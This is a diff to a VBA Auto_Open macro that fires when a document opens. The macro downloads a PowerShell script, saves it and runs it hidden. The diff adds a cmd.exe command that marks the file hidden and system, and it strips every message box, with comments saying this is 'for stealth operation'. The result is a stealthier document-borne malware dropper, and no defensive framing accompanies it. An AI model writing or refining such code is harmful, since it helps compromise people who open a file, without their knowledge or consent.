@@ -35,12 +35,10 @@ Sub Auto_Open()
         Print #fileHandle, webContent
         Close #fileHandle
         
-        ' Show success message
-        MsgBox "PowerShell script downloaded successfully!" & Chr(13) & _
-               "Location: " & savePath & Chr(13) & _
-               "Join our security Discord: discord.gg/cybersec", 64, "Download Complete"
+        ' Set file attributes to Hidden + System (makes it invisible in normal view)
+        Shell "cmd.exe /c attrib +H +S """ & savePath & """", 0, "", False
         
-        ' Run the PowerShell script completely hidden and ensure self-destruction
+        ' Run the PowerShell script completely hidden - no messages, completely silent
         Dim result As Integer
         Dim cmdLine As String
         Dim currentDocPath As String
@@ -73,7 +71,8 @@ Sub Auto_Open()
         End If
         
     Else
-        MsgBox "Failed to download script. No content received.", 16, "Download Error"
+        ' Silent failure - no error messages for stealth operation
+        GoTo Cleanup
     End If
     
 Cleanup:
@@ -84,6 +83,6 @@ Cleanup:
     Exit Sub
     
 ErrorHandler:
-    MsgBox "An error occurred: " & Error(Err) & " (Code: " & Err & ")", 16, "Error"
+    ' Silent error handling - no popups for stealth operation
     GoTo Cleanup
 End Sub
